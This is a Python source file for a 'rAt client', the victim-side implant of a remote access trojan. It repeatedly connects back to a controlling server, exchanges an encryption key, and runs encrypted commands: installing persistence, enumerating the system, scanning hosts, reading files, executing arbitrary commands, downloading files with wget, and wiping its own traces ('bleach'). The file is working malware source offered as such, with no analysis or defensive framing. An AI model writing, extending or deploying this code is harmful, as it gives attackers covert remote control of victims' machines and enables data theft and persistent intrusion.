#!/usr/bin/env python

# rAt client

import socket
import sys
import time
from core import crypto, tools, persistence, scan, enum

# server details
host = 'localhost'
port = 2222

# timeout before trying to reconn (seconds)
conn_timeout = 30

# platform check
if sys.platform.startswith('win'):
    plat = 'win'
elif sys.platform.startswith('linux'):
    plat = 'nix'
elif sys.platform.startswith('darwin'):
    plat = 'mac'
else:
    print('[!] platform not supported [!]')
    sys.exit(1)

def client_loop(conn, dhkey):
    while True:
        try:
            data = crypto.decrypt(conn.recv(4096), dhkey) # receive data from server + decrypt
        except socket.error:
            break # exit loop if socket error

        cmd, _, action = data.partition(' ')

        # process server commands
        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'bleach':
            conn.close()
            tools.bleach(plat)
            return 1

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'persistence':
            results = persistence.run(plat)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'enum':
            results = enum.run(plat)

        elif cmd == 'cat':
            results = tools.cat(action)

        elif cmd == 'execute':
            results = tools.execute(action)

        elif cmd == 'ls':
            results = tools.ls(action)

        elif cmd == 'pwd':
            results = tools.pwd()

        elif cmd == 'unzip':
            results = tools.unzip(action)

        elif cmd == 'wget':
            results = tools.wget(action)

        # results formatting
        results = results.rstrip() + '\n{} completed!'.format(cmd)

        # send results back to server
        conn.send(crypto.encrypt(results, dhkey))

def main():
    exit_status = 0

    while True:
        conn = socket.socket()
        # try to connect to server
        try:
            conn.connect((host, port))
        except socket.error:
            time.sleep(conn_timeout) # wait before retrying
            continue

        # key exchange
        dhkey = crypto.diffiehellman(conn)

        try:
            exit_status = client_loop(conn, dhkey)
        except Exception as e:
            # for debugging
            print(f'[!] error occurred: {e} [!]')

        # exit if client loop returns non-zero
        if exit_status:
            sys.exit(0)

if __name__ == '__main__':
    main()